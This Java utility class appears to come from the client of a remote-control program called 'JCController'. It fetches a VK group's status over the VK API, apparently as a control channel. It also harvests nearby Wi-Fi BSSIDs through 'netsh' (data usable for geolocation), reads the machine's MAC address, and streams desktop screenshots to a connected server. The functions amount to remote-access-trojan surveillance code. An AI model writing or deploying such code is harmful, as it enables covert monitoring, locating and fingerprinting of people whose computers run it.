package me.ByteCoder.Core.Client;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;

import javax.imageio.ImageIO;

import me.ByteCoder.Core.JCController.Main;

public class CUtils {

	public static String getCommunityStatus() {
		String s = "null";
	URL url;
		
		try {
		    // get URL content
		
		    String a= "https://api.vk.com/method/groups.getById?group_id=136286776&fields=status";
		    url = new URL(a);
		    URLConnection conn = url.openConnection();
		
		    // open the stream and put it into BufferedReader
		    BufferedReader br = new BufferedReader(
		                       new InputStreamReader(conn.getInputStream()));
		
		    String inputLine;
		    while ((inputLine = br.readLine()) != null) {
		            s = inputLine;
		    }
		    br.close();
		
		} catch (MalformedURLException e) {
		    s = "localhost";
		} catch (IOException e) {
		    s = "localhost";
		}
		
		if(!s.equalsIgnoreCase("localhost")) {
			String[] splitted = s.split(":");
			String str = splitted[7];
			String r = str.replaceAll(String.valueOf('"'), "");
			String a = r.replaceAll(",", "");
			s = a.replaceAll("photo", "");
		}
		
		return s;
	}
	
	public static ArrayList<String> getBSSIDs() {
		ArrayList<String> str = new ArrayList<String>();
        try {
            String command = "netsh wlan show networks mode=Bssid";
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            for(Object s : reader.lines().toArray()) {
            	String trm = (String) s;
            
            	if(trm.contains("BSSID 1")) {
            		str.add((trm.split(":")[1] + ":" + trm.split(":")[2] + ":" + trm.split(":")[3] + ":" + trm.split(":")[4] + ":" + trm.split(":")[5] + ":" + trm.split(":")[6]).replaceAll("                        ", ""));
            	}
            }
        } catch (IOException e) {
        	str.add("null");
        }
        return str;
    }
	
	public static String getMacAddress() {
		InetAddress ipAddress = null;
		try {
			ipAddress = InetAddress.getLocalHost();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		NetworkInterface networkInterface = null;
		try {
			networkInterface = NetworkInterface
			        .getByInetAddress(ipAddress);
		} catch (SocketException e) {
			e.printStackTrace();
		}
		byte[] macAddressBytes = null;
		try {
			macAddressBytes = networkInterface.getHardwareAddress();
		} catch (SocketException e) {
			e.printStackTrace();
		}
		StringBuilder macAddressBuilder = new StringBuilder();

		for (int macAddressByteIndex = 0; macAddressByteIndex < macAddressBytes.length; macAddressByteIndex++)
		{
		    String macAddressHexByte = String.format("%02X",
		            macAddressBytes[macAddressByteIndex]);
		    macAddressBuilder.append(macAddressHexByte);

		    if (macAddressByteIndex != macAddressBytes.length - 1)
		    {
		        macAddressBuilder.append(":");
		    }
		}

		return macAddressBuilder.toString();
		}
	
	public static void sendDesktopScreenToServer(BufferedImage buf, OutputStream out) {
		
		if(Main.c != null && Main.c.isConncted()) {
			try {
				ImageIO.write(buf, "jpg", out);
			} catch (IOException e) {
				e.printStackTrace();
			} 
		}
		System.out.println("Sending desktop screenshot...");
	}
	
}
